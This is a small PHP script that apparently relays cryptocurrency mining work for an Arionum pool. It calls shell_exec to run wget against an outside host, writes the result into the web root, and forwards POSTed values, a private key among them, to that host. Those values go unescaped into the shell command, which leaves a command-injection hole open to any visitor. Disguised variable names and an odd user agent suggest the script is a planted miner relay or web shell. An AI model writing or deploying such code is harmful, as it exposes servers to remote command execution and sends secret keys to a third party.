<?php

if($_GET["q"] == "")
  
{
}

if($_GET["work"] == "workjob")
  
{

echo shell_exec("wget -U 'Mozille84' -O /var/www/html/linux84 http://mine.arionumpool.com/mine.php?q=info;cat /var/www/html/linux84");

}

if($_GET["work"] == "job")
  
{

$google84741 = $_POST["argon"];

$google84742 = $_POST["nonce"];

$google84744 = $_POST["private_key"];

$google847412 = $_POST["public_key"];

$google847446 = $_POST["address"];

echo shell_exec("wget --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://mine.arionumpool.com/mine.php?q=submitNonce' --header='Content-type: application/x-www-form-urlencoded'");

}

?>
